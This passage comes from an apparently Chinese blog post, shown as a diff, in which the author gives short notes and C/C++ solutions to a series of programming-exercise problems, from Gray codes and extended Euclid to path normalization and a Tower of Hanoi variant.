+0<br>
+输出样例：<br>
+2<br>
+2</p>
+<p>用异或来模拟开关灯，用数组来存灯开关状态。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	int k;
+	while(1){
+		scanf(&quot;%d&quot;,&amp;k);
+		if(k == 0){
+			return 0;
+		}
+		int a[k+1] = {0};
+		for(int i=1;i&lt;=k;i++){
+			for(int j=1;j&lt;=k;j++){
+				if(j%i==0){
+					a[j] ^= 1;
+				}
+			}
+		}
+		int flag=0;
+		for(int m=1;m&lt;=k;m++){
+			if(a[m] == 1){
+				flag++;
+			}
+		}
+		printf(&quot;%d\n&quot;,flag);
+		
+	} 
+	
+}
+</code></pre>
+<p>https://www.nowcoder.com/discuss/353146879821160448</p>
+<p>利用公式推导，可以直接计算出数量</p>
+<pre><code class="language-c"> #include&lt;stdio.h&gt;
+ #include&lt;math.h&gt;
+ int main()
+ {
+    int k;
+    scanf(&quot;%d&quot;,&amp;k);
+    while(k!=0)
+    {
+        printf(&quot;%d\n&quot;,(int)sqrt(k));
+        scanf(&quot;%d&quot;,&amp;k);
+    }
+    return 0;
+ }
+</code></pre>
+<h2 id="0x16-dna排序">0x16 DNA排序</h2>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1741585477019.png" alt="" loading="lazy"></figure>
+<p>需要存字符串和相应的无序度在一起，最好使用链表的形式，加上有序插入即可。</p>
+<p>这里使用一个字符数组，再加一个数组存序号和无序度。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+	int n,m;
+	while(scanf(&quot;%d %d&quot;,&amp;n,&amp;m)!=EOF){
+		int a[n][2];
+		char s[m][n+1];
+		
+		int p=0;
+		while(p&lt;m){
+			
+			scanf(&quot;%s&quot;,s[p]);
+			int num=0;
+			for(int i=0;i&lt;n-1;i++){
+				for(int j=i+1;j&lt;n;j++){
+					if(s[p][i]&gt;s[p][j]){
+						num++;
+					}
+				}
+			}
+			a[p][0]=num;
+			a[p][1]=p;
+			p++;
+		}
+		
+		for(int i=0;i&lt;m-1;i++){
+			for(int j=i;j&lt;m;j++){
+				if(a[i][0] &gt; a[j][0]){
+					int tmp = a[i][0];
+					a[i][0] = a[j][0];
+					a[j][0] = tmp;
+					tmp = a[i][1];
+					a[i][1] = a[j][1];
+					a[j][1] = tmp;
+				}
+			}
+		}
+		
+		for(int i=0;i&lt;m;i++){
+			printf(&quot;%s\n&quot;,s[a[i][1]]);
+		}
+		printf(&quot;********************\n&quot;);
+	}
+}
+</code></pre>
+<h2 id="0x17-滑雪">0x17 滑雪</h2>
+<p>https://blog.csdn.net/qqqqq1993qqqqq/article/details/76559419</p>
+<p>动态规划，往四个方向走，取最长。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+
+
+int path[50][50];
+int dp[50][50];
+int m,n; 
+int M[4][2]={{-1,0},{0,-1},{1,0},{0,1}};
+
+int Getpath(int x,int y){
+	int nx;
+	int ny;
+	int i,j,k;
+	int max=0;
+	int temp;
+	if(dp[x][y]&gt;0)	{
+	    return dp[x][y];
+	}
+	for(k=0;k&lt;4;k++){
+	    nx=x+M[k][0];
+	    ny=y+M[k][1];
+	    if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m){
+	        if(path[x][y]&gt;path[nx][ny]){
+	            temp=Getpath(nx,ny)+path[x][y]-path[nx][ny];
+	            //要在在这里就把每一次的最大值记录下来 
+	            if(temp&gt;max){
+	                max=temp;
+				}
+			}
+		}
+	}
+	//将从该点出发的最大值记录到dp中，并返回 
+	dp[x][y]=max;
+	return max;
+}
+
+void Init(int n,int m){
+	int i,j;
+	for(i=0;i&lt;n;i++){
+		for(j=0;j&lt;m;j++){
+			scanf(&quot;%d&quot;,&amp;path[i][j]);
+			dp[i][j]=0;
+		}
+	}
+}
+
+
+int main(){
+	
+	int max=0;
+	int depth;
+	int i,j;
+	scanf(&quot;%d %d&quot;,&amp;n,&amp;m);
+	while(m!=0&amp;&amp;n!=0)
+	{
+	    Init(n,m);
+	    for(i=0;i&lt;n;i++)
+	    {
+	        for(j=0;j&lt;m;j++)
+	        {
+	            depth=Getpath(i,j);
+	            //得到所有返回的点中的最大值 
+	            if(depth&gt;max)
+	            {
+	                max=depth;
+	             } 
+	        }
+	    }
+	    printf(&quot;%d\n&quot;,max);
+	    max=0; 
+	    scanf(&quot;%d %d&quot;,&amp;n,&amp;m);
+	}
+	return 0;
+}
+
+</code></pre>
+<h2 id="0x18-俄罗斯方块">0x18 俄罗斯方块</h2>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1741603306950.png" alt="" loading="lazy"></figure>
+<p>这题比较复杂，A数组中多加了几行1，防止<code>level+i</code>处越界</p>
+<p>有一种特殊情况需要考虑，就是下面小上面大的图形，能通过一些缺口。</p>
+<p>主要思路就是，先找到哪一层放不了。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+
+int A[20][10];
+int M[4][4];
+int k; 
+ 
+void Merge(int level);
+int Down();
+void Init();
+
+int main()
+{
+	int i,j;
+	int level; 
+	Init();
+	level=Down();
+	Merge(level);
+	for(i=0;i&lt;15;i++){
+		for(j=0;j&lt;10;j++){
+	        printf(&quot;%d &quot;,A[i][j]);
+	    }
+	    printf(&quot;\n&quot;);
+	}
+	return 0;
+}
+void Merge(int level){
+	int flag=0;
+	int i,j;
+	for(i=3;i&gt;=0;i--){
+    	for(j=k-1;j&lt;k+3;j++){
+	        if(A[level+i][j]==1&amp;&amp;M[i][j-k+1]==1){
+	            flag=1;
+	            break;
+        	}
+    	}
+	    if(flag==1){
+	        flag=0;
+	        level--;
+	        i=3;   
+	    }  
+	}
+	for(i=level;i&lt;level+4;i++){
+		for(j=k-1;j&lt;k+3;j++){
+			A[i][j] += M[i-level][j-k+1];
+		}
+	}
+} 
+ 
+int Down()
+{
+	int i,j,n;
+	for(i=0;i&lt;15;i++){
+	    for(j=k-1;j&lt;k+3;j++){
+	        for(n=3;n&gt;=0;n--){
+	            if(A[i][j]+M[n][j-k+1]&gt;1){
+	                return i;
+	            }
+	        }
+	    }
+	}
+	return i;
+}
+ 
+void Init(){
+	int i,j;
+	
+	for(i=0;i&lt;15;i++){
+    	for(j=0;j&lt;10;j++){
+        scanf(&quot;%d&quot;,&amp;A[i][j]);
+    	}
+	}
+	
+	for(i=0;i&lt;10;i++){
+		for(j=15;j&lt;21;j++){
+			A[j][i] = 1;
+		}
+		
+	}
+	for(i=0;i&lt;4;i++){
+	    for(j=0;j&lt;4;j++){
+	        scanf(&quot;%d&quot;,&amp;M[i][j]);
+	    }
+	}
+	
+	scanf(&quot;%d&quot;,&amp;k);
+}
+</code></pre>
+<p>优化一下方法,从上到下一次比较4*4方块，遇到不满足时回退一层即可。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+
+int A[18][10];
+int M[4][4];
+int k; 
+ 
+void Init();
+
+int main()
+{
+	int i,j,m;
+	int level; 
+	int flag = 0;
+	Init();
+	for(i=0;i&lt;15;i++){
+		for(m=0;m&lt;4;m++){
+			for(j=0;j&lt;4;j++){
+				if(A[i+m][k+j-1]==1&amp;&amp;M[m][j]==1){
+					flag=1;
+					break;
+				}
+			}
+			if(flag==1){
+				break;
+			}
+		}
+		if(flag==1){
+			break;
+		}
+	}
+
+	level = i-1;
+	
+	for(i=level;i&lt;level+4;i++){
+		for(j=k-1;j&lt;k+3;j++){
+			A[i][j] += M[i-level][j-k+1];
+		}
+	}
+	for(i=0;i&lt;15;i++){
+		for(j=0;j&lt;10;j++){
+	        printf(&quot;%d &quot;,A[i][j]);
+	    }
+	    printf(&quot;\n&quot;);
+	}
+	return 0;
+}
+
+ 
+void Init(){
+	int i,j;
+	
+	for(i=0;i&lt;15;i++){
+    	for(j=0;j&lt;10;j++){
+        scanf(&quot;%d&quot;,&amp;A[i][j]);
+    	}
+	}
+	
+	for(i=15;i&lt;19;i++){
+		for(j=0;j&lt;10;j++){
+			A[i][j] = 1;
+		}
+	}
+		
+	for(i=0;i&lt;4;i++){
+	    for(j=0;j&lt;4;j++){
+	        scanf(&quot;%d&quot;,&amp;M[i][j]);
+	    }
+	}
+	
+	scanf(&quot;%d&quot;,&amp;k);
+}
+</code></pre>
+<h2 id="0x19-路径解析">0x19 路径解析</h2>
+<p>描述<br>
+在操作系统中，数据通常以文件的形式存储在文件系统中。文件系统一般采用层次化的组织形式，由目录（或者文件夹）和文件构成，形成一棵树的形状。文件有内容，用于存储数据。目录是容器，可包含文件或其他目录。同一个目录下的所有文件和目录的名字各不相同，不同目录下可以有名字相同的文件或目录。<br>
+　　为了指定文件系统中的某个文件，需要用路径来定位。在类 Unix 系统（Linux、Max OS X、FreeBSD等）中，路径由若干部分构成，每个部分是一个目录或者文件的名字，相邻两个部分之间用 / 符号分隔。<br>
+　　有一个特殊的目录被称为根目录，是整个文件系统形成的这棵树的根节点，用一个单独的 / 符号表示。在操作系统中，有当前目录的概念，表示用户目前正在工作的目录。根据出发点可以把路径分为两类：<br>
+　　绝对路径：以 / 符号开头，表示从根目录开始构建的路径。<br>
+　　相对路径：不以 / 符号开头，表示从当前目录开始构建的路径。<br>
+ <br>
+例如，有一个文件系统的结构如下图所示。在这个文件系统中，有根目录 / 和其他普通目录 d1、d2、d3、d4，以及文件 f1、f2、f3、f1、f4。其中，两个 f1 是同名文件，但在不同的目录下。</p>
+<p>对于 d4 目录下的 f1 文件，可以用绝对路径 /d2/d4/f1 来指定。如果当前目录是 /d2/d3，这个文件也可以用相对路径 ../d4/f1 来指定，这里 .. 表示上一级目录（注意，根目录的上一级目录是它本身）。还有 . 表示本目录，例如 /d1/./f1 指定的就是 /d1/f1。注意，如果有多个连续的 / 出现，其效果等同于一个 /，例如 /d1///f1 指定的也是 /d1/f1。<br>
+　　本题会给出一些路径，要求对于每个路径，给出正规化以后的形式。一个路径经过正规化操作后，其指定的文件不变，但是会变成一个不包含 . 和 .. 的绝对路径，且不包含连续多个 / 符号。如果一个路径以 / 结尾，那么它代表的一定是一个目录，正规化操作要去掉结尾的 /。若这个路径代表根目录，则正规化操作的结果是 /。若路径为空字符串，则正规化操作的结果是当前目录。<br>
+ <br>
+输入<br>
+ <br>
+　　第一行包含一个整数 P，表示需要进行正规化操作的路径个数。<br>
+　　第二行包含一个字符串，表示当前目录。<br>
+　　以下 P 行，每行包含一个字符串，表示需要进行正规化操作的路径。<br>
+ <br>
+输出<br>
+ <br>
+　　共 P 行，每行一个字符串，表示经过正规化操作后的路径，顺序与输入对应。<br>
+ <br>
+样例<br>
+ <br>
+输入	<br>
+7<br>
+/d2/d3</p>
+<p>/d2/d4/f1<br>
+../d4/f1<br>
+/d1/./f1<br>
+/d1///f1<br>
+/d1/<br>
+///<br>
+/d1/../../d2</p>
+<p>输出<br>
+/d2/d4/f1<br>
+/d2/d4/f1<br>
+/d1/f1<br>
+/d1/f1<br>
+/d1<br>
+/<br>
+/d2<br>
+ <br>
+ <br>
+用例规模与约定<br>
+ <br>
+　　1 ≤ P ≤ 10。<br>
+　　文件和目录的名字只包含大小写字母、数字和小数点 .、减号 - 以及下划线 _。<br>
+　　不会有文件或目录的名字是 . 或 .. ，它们具有题目描述中给出的特殊含义。<br>
+　　输入的所有路径每个长度不超过 1000 个字符。<br>
+　　对于前 30% 的测试用例，需要正规化的路径的组成部分不包含 . 和 .. 。<br>
+　　对于前 60% 的测试用例，需要正规化的路径都是绝对路径。</p>
+<p>首先判断是相对路径还是绝对路径，拼接成完全路径。</p>
+<p>最后再对路径进行解析。</p>
+<p>遇到<code>.</code>掠过，遇到<code>..</code>跳到上一层路径。</p>
+<p>strtok函数用来分割字符串，以<code>/</code>为标志。</p>
+<pre><code class="language-c">#include &lt;bits/stdc++.h&gt;
+
+char pwd[1001];
+
+void normalize(char* s){
+	char NowDir[2400] = {0};
+	char *stack[2024];
+	int top=0;
+	int len;
+	
+	if(s[0]!='/'){
+		strcpy(NowDir,pwd);
+		len=strlen(NowDir);
+		NowDir[len]='/';
+	}
+	strcat(NowDir,s);
+
+	for(char *p=strtok(NowDir,&quot;/&quot;);p!=NULL;p=strtok(NULL,&quot;/&quot;)){
+		len=strlen(p);
+		if(len==1&amp;&amp;strcmp(p,&quot;.&quot;)==0){
+			continue;
+		}else{
+			if(len==2&amp;&amp;strcmp(p,&quot;..&quot;)==0){
+				if(top&gt;0){
+					top--;
+				}
+			}else{
+				stack[top]=p;
+				top++;
+			}
+		}
+	}
+	
+	if(top==0){
+		printf(&quot;/&quot;);
+	}
+	for(int i=0;i&lt;top;i++){
+		printf(&quot;/&quot;);
+		printf(&quot;%s&quot;,stack[i]);
+	}
+	printf(&quot;\n&quot;);
+	return;
+}
+
+
+
+int main(){
+	int p;
+	scanf(&quot;%d&quot;,&amp;p);
+	scanf(&quot;%s&quot;,pwd);
+	char S[p][2002];
+	for(int i=0;i&lt;p;i++){
+		scanf(&quot;%s&quot;,S[i]);
+	}
+	
+	for(int i=0;i&lt;p;i++){
+		normalize(S[i]);
+	}
+	
+	return 0;
+}
+
+</code></pre>
+<h2 id="0x20-火车购票">0x20 火车购票</h2>
+<p>描述<br>
+ <br>
+　　请实现一个铁路购票系统的简单座位分配算法，来处理一节车厢的座位分配。<br>
+　　假设一节车厢有20排、每一排5个座位。为方便起见，我们用1到100来给所有的座位编号，第一排是1到5号，第二排是6到10号，依次类推，第20排是96到100号。<br>
+　　购票时，一个人可能购一张或多张票，最多不超过5张。如果这几张票可以安排在同一排编号相邻的座位，则应该安排在编号最小的相邻座位。否则应该安排在编号最小的几个空座位中（不考虑是否相邻）。<br>
+　　假设初始时车票全部未被购买，现在给了一些购票指令，请你处理这些指令。<br>
+ <br>
+输入<br>
+ <br>
+　　输入的第一行包含一个整数n，表示购票指令的数量。<br>
+　　第二行包含n个整数，每个整数p在1到5之间，表示要购入的票数，相邻的两个数之间使用一个空格分隔。<br>
+ <br>
+输出<br>
+ <br>
+　　输出n行，每行对应一条指令的处理结果。<br>
+　　对于购票指令p，输出p张车票的编号，按从小到大排序。<br>
+ <br>
+样例<br>
+ <br>
+输入	<br>
+4<br>
+2 5 4 2</p>
+<p>输出<br>
+1 2<br>
+6 7 8 9 10<br>
+11 12 13 14<br>
+3 4<br>
+ <br>
+ <br>
+样例说明<br>
+ <br>
+　　1) 购2张票，得到座位1、2。<br>
+　　2) 购5张票，得到座位6至10。<br>
+　　3) 购4张票，得到座位11至14。<br>
+4) 购2张票，得到座位3、4。 <br>
+ <br>
+评测用例规模与约定<br>
+ <br>
+　　对于所有评测用例，1 ≤ n ≤ 100，所有购票数量之和不超过100。</p>
+<p>依次看每排能放下不，能放下就依次放入。<br>
+不能放入就从头开始找空位放入。</p>
+<pre><code class="language-c">#include &lt;bits/stdc++.h&gt;
+
+int main(){
+	int n;
+	int p[100];
+	int num[20] = {0};
+	
+	
+	scanf(&quot;%d&quot;,&amp;n);
+	for(int i=0;i&lt;n;i++){
+		scanf(&quot;%d&quot;,&amp;p[i]);
+	}
+	
+	for(int j=0;j&lt;n;j++){
+		int flag=0;
+		for(int i=0;i&lt;20;i++){
+			if((5-num[i])&gt;=p[j]){
+				for(int k=num[i];k&lt;num[i]+p[j];k++){
+					printf(&quot;%d &quot;,i*5+k+1);
+				}
+				printf(&quot;\n&quot;);
+				num[i] += p[j];
+				flag=1;
+				break;
+			}
+		}
+//		for(int i = 0;i&lt;20;i++){
+//			printf(&quot;%d&quot;,num[i]);
+//		}
+		if(flag==1){
+			continue;
+		}
+//		printf(&quot;flag:%d&quot;,flag);
+		while(p[j]--){
+			for(int i=0;i&lt;20;i++){
+				if(num[i]&lt;5){
+					printf(&quot;%d &quot;,i*5+num[i]+1); 
+					num[i]++;
+					break;
+				}
+			}
+		}
+		printf(&quot;\n&quot;);
+	}
+	return 0;
+	
+	
+}
+</code></pre>
+<h2 id="0x21-格雷码">0x21 格雷码</h2>
+<p>题目描述<br>
+通常，人们习惯将所有 n 位二进制串按照字典序排列，例如所有 2 位二进制串按字典序从小到大排列为：00，01，10，11。<br>
+格雷码（Gray Code）是一种特殊的 n 位二进制串排列法，它要求相邻的两个二进制串间恰好有一位不同，特别地，第一个串与最后一个串也算作相邻。<br>
+所有 2 位二进制串按格雷码排列的一个例子为：00，01，11，10。<br>
+n 位格雷码不止一种，下面给出其中一种格雷码的生成算法：<br>
+1.1 位格雷码由两个 1 位二进制串组成，顺序为：0，1。<br>
+2.n + 1 位格雷码的前 2^n 个二进制串，可以由依此算法生成的 n 位格雷码（总共 2^n 个 n 位二进制串）按顺序排列，再在每个串前加一个前缀 0 构成。<br>
+3.n + 1 位格雷码的后 2^n 个二进制串，可以由依此算法生成的 n 位格雷码（总共 2^n 个 n 位二进制串）按逆序排列，再在每个串前加一个前缀 1 构成。<br>
+综上，n + 1 位格雷码，由 nn 位格雷码的 2^n 个二进制串按顺序排列再加前缀 0，和按逆序排列再加前缀 1 构成，共 2^(n+1) 个二进制串。另外，对于 n 位格雷码中的 2^n 个 二进制串，我们按上述算法得到的排列顺序将它们从 0∼2^n−1 编号。<br>
+按该算法，2 位格雷码可以这样推出：<br>
+1.已知 1 位格雷码为 0，1。<br>
+2.前两个格雷码为 00，01。后两个格雷码为 11，10。合并得到 00，01，11，10，编号依次为 0 ~ 3。<br>
+同理，3 位格雷码可以这样推出：<br>
+1.已知 2 位格雷码为：00，01，11，10。<br>
+2.前四个格雷码为：000，001，011，010。后四个格雷码为：110，111，101，100。合并得到：000，001，011，010，110，111，101，100，编号依次为 0 ~ 7。<br>
+现在给出 n，k，请你求出按上述算法生成的 n 位格雷码中的 k 号二进制串。<br>
+输入格式<br>
+仅一行两个整数 n，k，意义见题目描述。<br>
+输出格式<br>
+仅一行一个 n 位二进制串表示答案。<br>
+样例 #1<br>
+样例输入 #1<br>
+2 3<br>
+样例输出 #1<br>
+10<br>
+样例 #2<br>
+样例输入 #2<br>
+3 5<br>
+样例输出 #2<br>
+111<br>
+样例 #3<br>
+样例输入 #3<br>
+44 1145141919810<br>
+样例输出 #3<br>
+00011000111111010000001001001000000001100011<br>
+提示<br>
+【样例 1 解释】<br>
+2 位格雷码为：00，01，11，10，编号从 0∼3，因此 3 号串是 10。<br>
+【样例 2 解释】<br>
+3 位格雷码为：000，001，011，010，110，111，101，100，编号从 0∼7，因此 5 号串是 111。<br>
+【数据范围】<br>
+对于 50% 的数据：n≤10<br>
+对于 80% 的数据：k≤5×10^6<br>
+对于 95% 的数据：k≤2^63−1<br>
+对于 100% 的数据：1≤n≤64, 0≤k&lt;2^n<br>
+时空限制<br>
+1s, 256MB<br>
+from CSP-S2019 D1T1</p>
+<p>主要难点在后一半格雷码的逆序，按数学公式转化为前一半中的位置。</p>
+<pre><code class="language-c">#include &lt;bits/stdc++.h&gt;
+
+void GrayCode(char code[], int bit,long long int num){
+	int i=0;
+	if(bit == 1){
+		if(num==0){
+			code[0]='0';
+			return;
+		}else if(num==1){
+			code[0]='1';
+			return;
+		}
+	}
+	if(num&lt;pow(2,bit-1)){
+		code[0]='0';
+		GrayCode(code+1,bit-1,num);
+	}else if(num&gt;=pow(2,bit-1)){
+		code[0]='1';
+		GrayCode(code+1,bit-1,pow(2,bit)-num-1);
+	}
+}
+
+
+int main(){
+	int bit;
+	long long int num;
+	char code[65];
+	while(scanf(&quot;%d %lld&quot;,&amp;bit,&amp;num)!=EOF){
+	
+		GrayCode(code,bit,num);
+		for(int i=0;i&lt;bit;i++){
+			printf(&quot;%c&quot;,code[i]);
+		}
+		printf(&quot;\n&quot;);
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="0x22-欧几里得扩展">0x22 欧几里得扩展</h2>
+<p>描述<br>
+在RSA密码体系中, 欧几里得算法是加密或解密运算的重要组成部分。它的基本运算过程就是解 x*a=1 mod n 这种方程。整个解的过程是这样的，我们用一个例子来说明。<br>
+当 a=1001，n=3837 时，方程为 x∗1001=1(mod3837)<br>
+求解过程：<br>
+3837 = 3 * 1001 + 834<br>
+1001 = 1 * 834 + 167<br>
+834 = 4 * 167 + 166<br>
+167 = 166 + 1<br>
+所以<br>
+1 = 1 * 167 + (–1) * 166<br>
+= 1 * 167 + (-1) * (834 - 4 * 167)<br>
+= -1 * 834 + 5 * 167<br>
+= –1 * 834 + 5 * (1001 - 834)<br>
+= 5 * 1001 + (-6) * 834<br>
+= 5 * 1001 - 6 * (3837 -3 * 1001)<br>
+= -6 * 3837 + 23 * 1001<br>
+然后对等式两端同时除以模3837得<br>
+23 * 1001 = 1 (mod 3837)<br>
+于是 x = 23<br>
+现在给出a和n，你能不能在最短的时间内解出这个方程呢？<br>
+输入<br>
+输入包括多组测试数据。每组测试数据对应输入的一行，每行包括两个整数a和n。1&lt;a,n&lt;2^31(用long可以存下)<br>
+当a=n=0时输入结束，这组数据不包括在需要计算的数据中。<br>
+输出<br>
+对应每组输入数据，输出最小的满足题意的解x。<br>
+样例<br>
+输入<br>
+1001 3837<br>
+136468984 134548555<br>
+0 0<br>
+输出<br>
+23<br>
+112206854<br>
+提示<br>
+1.本题用穷举是不可能做出来的<br>
+2.结果必须是正数</p>
+<p>即求乘法逆元</p>
+<p>当两数互素时，才存在逆元，即最大公约数为1.<br>
+在求最大公约数的递归中，添加了求x，y的代码。<br>
+有点难理解。😢</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+ // 扩展欧几里得算法
+int extendedEuclid(int a, int b, int *x, int *y) {
+	if (b == 0) {
+	    *x = 1;
+	    *y = 0;
+	    return a;
+	}
+	int x1, y1;
+	int gcd = extendedEuclid(b, a % b, &amp;x1, &amp;y1);
+	*x = y1;
+	*y = x1 - (a / b) * y1;
+	return gcd;
+}
+
+
+int main() {
+	int a, n;
+	// 读取输入直到文件结束
+	scanf(&quot;%d %d&quot;, &amp;a, &amp;n);
+	while(a!=0&amp;&amp;n!=0) {
+	    int x, y;
+	    int gcd = extendedEuclid(a, n, &amp;x, &amp;y);
+	    if (gcd == 1) {
+	        // 计算模逆
+	        while (x &lt; 0)
+	            x += n;
+	        
+	        printf(&quot;%d\n&quot;, x);
+	    }
+	    scanf(&quot;%d %d&quot;, &amp;a, &amp;n); 
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="0x23-scu猫抓老鼠">0x23 SCU猫抓老鼠</h2>
+<p>描述<br>
+不知你是否注意到，四川大学每年都会在各宿舍楼里放老鼠药，以解决学生宿舍的老鼠问题。 今年，学校的领导为了更好的展开灭鼠的行动，引进了一项新的技术：SCU(Super Cat Union)。 它是通过两只机器猫对宿舍楼的扫描来判断老鼠的所在，然后采取相应的措施。 这下可惹急了我们的FatMouse，它通过努力，终于找到了SCU的一个bug…<br>
+假设两只猫的工作范围各是一个球，猫位于球中心。在三维空间中两个球的相交点构成一个平面(假设在本题中两个球总是相交的)。 当老鼠在这个相交点构成的平面上时，SCU无法检测到老鼠的存在。 现在我们给出某一时刻两个机器猫的位置和他们工作范围的半径， 请问当FatMouse在某一个位置(x，y，z)上时，SCU是否能检测到FatMouse?<br>
+输入<br>
+输入的第一行为总的测试数据组数n。接下来一共有n行，每行代表一组测试数据。 每组测试数据包括11个整数，前面4个是SCU第一个机器猫所在的位置和它的工作半径，接下来的4个是第二个机器猫的位置和工作半径。 最后3个数是FatMouse的位置。<br>
+输出<br>
+对应每一组输入数据，判断FatMouse是否会被检测到。如果FatMouse能被检测到，输出Yes，否则，输出No。<br>
+样例<br>
+输入<br>
+3<br>
+0 0 0 8 10 0 0 8 5 5 5<br>
+0 0 0 8 10 0 0 8 5 0 0<br>
+0 0 0 8 10 0 0 8 0 8 0<br>
+输出<br>
+No<br>
+No<br>
+Yes</p>
+<p>主要是数学公式，空间几何，</p>
+<p>x<sup>2+y</sup>2+z<sup>2=8</sup>2<br>
+(x-10)<sup>2+y</sup>2+z<sup>2=8</sup>2</p>
+<p>合并两公式，得x=5，即相交点形成的平面。</p>
+<p>再通用一点</p>
+<p>(x-x1)<sup>2+(y-y1)</sup>2+(z-z1)<sup>2=r1</sup>2;<br>
+(x-x2)<sup>2+(y-y1)</sup>2+(z-z1)<sup>2=r2</sup>2;</p>
+<p>当x，y，z带入其中，等式相同时，即为交点形成的平面上的点。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;math.h&gt;
+
+ int main()
+ {
+    int d1;
+    int d2;
+    int x1,y1,z1,r1,x2,y2,z2,r2,x,y,z;
+    int n;
+    scanf(&quot;%d&quot;,&amp;n);
+    while(n--){
+	    scanf(&quot;%d %d %d %d %d %d %d %d %d %d %d&quot;,&amp;x1,&amp;y1,&amp;z1,&amp;r1,&amp;x2,&amp;y2,&amp;z2,&amp;r2,&amp;x,&amp;y,&amp;z);
+	    d1=pow(x1-x,2)+pow(y1-y,2)+pow(z1-z,2)-pow(r1,2);
+	    d2=pow(x2-x,2)+pow(y2-y,2)+pow(z2-z,2)-pow(r2,2);
+	    if(d1&gt;0&amp;&amp;d2&gt;0)
+	    {
+	        printf(&quot;No\n&quot;);
+	    }else
+	    {
+	        if(d1==d2)
+	        {
+	            printf(&quot;No\n&quot;);
+	        }else
+	        {
+	            printf(&quot;Yes\n&quot;);  
+	        }   
+	    }
+	}
+    return 0;
+ }
+</code></pre>
+<h2 id="0x24-不甘心皇后">0x24 不甘心皇后</h2>
+<p>https://noobdream.com/DreamJudge/Issue/page/1970/</p>
+<p>比一般八皇后问题要简单</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;math.h&gt;
+
+int route[11];
+int iniPos[11];
+int result;
+
+bool is_OK(int s)
+{
+    if (s == 1 || abs(route[s] - route[s - 1]) &lt;= 1)
+        return true;
+    else
+        return false;
+}
+
+void queen(int n, int s)
+{
+    if (s &gt; n)
+        result++;
+    else
+    {
+        if (iniPos[s] == 0)
+        {
+            int row;
+            for (row = 1; row &lt;= n; row++)
+            {
+                route[s] = row;
+                if (is_OK(s))
+                    queen(n, s + 1);
+            }
+        }
+        else
+        {
+            route[s] = iniPos[s];
+            if (is_OK(s))
+                queen(n, s + 1);
+        }
+    }
+}
+
+int main()
+{
+    int n;
+    int i;
+    while (scanf(&quot;%d&quot;, &amp;n) == 1 &amp;&amp; n)
+    {
+        result = 0;
+        for (i = 1; i &lt;= n; i++)
+            scanf(&quot;%d&quot;, &amp;iniPos[i]);
+        queen(n, 1);
+        printf(&quot;%d\n&quot;, result);
+    }
+    return 0;
+}
+</code></pre>
+<h2 id="0x25-炉石传说">0x25 炉石传说</h2>
+<h2 id="0x26-小贝得汉诺塔">0x26 小贝得汉诺塔</h2>
+<p>题目背景</p>
+<p>汉诺塔是由三根柱子 A，B，C 组成的。A 柱上有 N个（N&gt;0）穿孔圆盘，盘的尺寸由下到上依次变小，盘的数字编号由上到下依次递增（1号为最顶部，也就是最小的圆盘）。<br>
+要求按下列规则将所有圆盘移至 C 柱：<br>
+1.每次只能移动一个圆盘；<br>
+2.任何时刻都不允许将较大的圆盘压在较小的圆盘之上大盘不能叠在小盘上面；<br>
+3.在满足上述两条规则的前提下，可以将圆盘移动至任何一个柱子。<br>
+要求打印出出若干行，每行表示盘子的一次移动，同时你需要让移动步骤最少。</p>
+<p>如：1 A-&gt;C 表示将 1 号圆盘从 A 柱移到 C 柱<br>
+聪明的小贝很快就用递归的方法解决了这个任务：</p>
+<pre><code class="language-c">void calc(int num, char x, char y, char z) //表示将 num 个盘子，从 x 柱子借助 y 柱子运送到 z 柱子{
+	if (!num) return; 
+	//num=0，不用运送 
+	calc(num - 1, x, z, y); 
+	//先将 x 柱子的 num - 1 个盘子，借助 z 柱子运送到 y 柱子 
+	printf(&quot;%d %c-&gt;%c\n&quot;, num, x, z);
+	//此时 x 柱子就只剩一个盘子了，就可以直接运送到 z 柱子 
+	calc(num - 1, y, x, z);
+	//再将之前运到 y 柱子的 num - 1 个盘子，借助 x 柱子运送到 z 柱子 
+	//这样就实现了函数功能“将 num 个盘子，从 x 柱子借助 y 柱子运送到 z 柱子” 
+}
+int main(){
+	int N;
+	scanf(&quot;%d&quot;, &amp;N);
+	calc(N, 'A', 'B', 'C');
+	//将 N 个盘子，从 A 柱子借助 B 柱子运送到 C 柱子
+}
+</code></pre>
+<p>题目描述<br>
+小贝想尝试更复杂的汉诺塔。<br>
+他更改了普通的汉诺塔的第 3 条规则，要求“只能将圆盘移动到相邻的柱子”。<br>
+也就是说，不能将圆盘从 A 柱移至 C 柱，也不能从 C 柱移至 A 柱。<br>
+你能帮助小贝解决这个特殊的汉诺塔问题吗？<br>
+输入格式<br>
+一个正整数 N，表示 A 柱上有 NN 个穿孔圆盘，N &lt; 14。<br>
+输出格式<br>
+你需要输出若干行，表示最优的移动方案（移动步数最少）。<br>
+每行表示一次移动，表示将圆盘从某一个塔移动到另一个塔：<br>
+格式：圆盘编号 塔的编号-&gt;塔的编号<br>
+输入样例<br>
+2<br>
+输出样例<br>
+1 A-&gt;B 1 B-&gt;C 2 A-&gt;B 1 C-&gt;B 1 B-&gt;A 2 B-&gt;C 1 A-&gt;B 1 B-&gt;C<br>
+时空限制<br>
+1s，256MB</p>
+<p>参考标准汉诺塔进行部分修改。</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void calc(int num, char x, char y, char z){ //表示将 num 个盘子，从 x 柱子借助 y 柱子运送到 z 柱子
+	if (!num) return; 
+	//num=0，不用运送 
+	calc(num - 1, x, y, z); 
+	//将num-1个盘子，从x柱子借助y柱子运送到z柱子 
+	printf(&quot;%d %c-&gt;%c\n&quot;, num, x, y);
+	//将剩下的一个盘子从x运到y 
+	calc(num - 1, z, y, x);
+	//将num-1个盘子，从z柱子借助y柱子运送到x柱子 
+	printf(&quot;%d %c-&gt;%c\n&quot;, num, y, z);
+	//将剩下的一个盘子从y运到z 
